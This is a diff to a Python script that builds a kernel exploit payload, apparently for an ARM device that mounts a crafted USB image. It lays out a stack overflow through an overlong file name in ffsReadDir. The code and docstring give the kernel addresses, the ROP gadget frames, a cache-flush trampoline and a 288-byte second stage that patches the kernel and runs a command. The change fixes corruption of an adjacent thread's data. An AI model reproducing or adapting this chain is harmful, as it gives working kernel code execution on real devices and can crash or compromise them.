@@ -5,16 +5,20 @@ Why this exists: the original kand-usb-final.img chain carried a 612-byte second
 stage at uniname+1420, so the 2040-byte name copy ran 0x13c bytes past the top
 of the 8 KiB kernel stack and wrote into the adjacent task's thread_info.  It
 also ran the stage with sp above the stack top, so current_thread_info()
-resolved to the wrong stack.  This builder emits a 288-byte stage (UEP patch + p2 stage1 command) that
-keeps the whole copy inside the stack and derives sp from the live memcpy r1.
+resolved to the wrong stack.  This builder emits a 288-byte stage (UEP patch +
+p2 command + park loop) that keeps the whole copy inside the stack and derives
+sp from the live memcpy r1.
+
+The tail parks the readdir thread with schedule_timeout_uninterruptible(250)
+instead of `b .`, so one core is not pegged for the rest of the boot.
 
 Layout (all addresses are for the shipped uImage, load 0xc0008000):
   DEST   = 0xc00083dc  memcpy destination (36 bytes before CAVE)
   CAVE   = 0xc0008400  copy-window epilogue frame
   STORE  = 0xc0008424  r1-saving gadget frame
   FLUSH  = 0xc0008434  flush-wrapper frame
-  STAGE0 = 0xc0008448  28-byte cache-flush trampoline
-  FULL   = 0xc0008464  payload
+  STAGE0 = 0xc0008448  24-byte cache-flush trampoline
+  FULL   = 0xc0008460  payload (4-byte pad removed)
 
 The ffsReadDir epilogue needs (payload byte offsets from uniname):
   +528 r6=DEST  +548 fp=0xc0008424  +552 sp=FAKE  +556 pc=ldmge
@@ -27,7 +31,7 @@ CAVE=DEST+36
 STORE=DEST+72
 FLUSH=DEST+88
 STAGE0=DEST+108
-FULL=DEST+136
+FULL=DEST+132
 FAKE_SP=0xc0008e00
 LDMGE=0xc051ad5c
 COPYWIN=0xc0100904
@@ -49,7 +53,7 @@ def words(*xs): return b''.join(p32(x) for x in xs)
 stage0=assemble('stage0.S','stage0.bin')
 payload=assemble('payload.S','payload.bin')
 assert len(stage0)==24, len(stage0)
-blob_len=136+len(payload)
+blob_len=132+len(payload)
 assert blob_len==288, (blob_len,len(payload))
 ldm=words(0x41414141,0x42424242,MEMCPY,0x43434343,blob_len,
           0x44444444,0x45454545,FAKE_SP,COPYWIN)
@@ -57,8 +61,7 @@ frame1=words(STORE_ADDR,0x46464646,0x47474747,0x48484848,0x49494949,
              0x4a4a4a4a,STORE+16,FAKE_SP,STOREG)
 storef=words(STAGE0,STAGE0,STORE_ADDR,FLUSHW)
 flushf=words(FULL,FULL+len(payload),0x4b4b4b4b,STORE_ADDR,STAGE0)
-pad=b'\x41'*4
-blob=ldm+frame1+storef+flushf+stage0+pad+payload
+blob=ldm+frame1+storef+flushf+stage0+payload
 assert len(blob)==288
 zs=[i for i in range(0,len(blob)-1,2) if struct.unpack_from('<H',blob,i)[0]==0]
 expected=[18] if (blob_len>>16)==0 else []
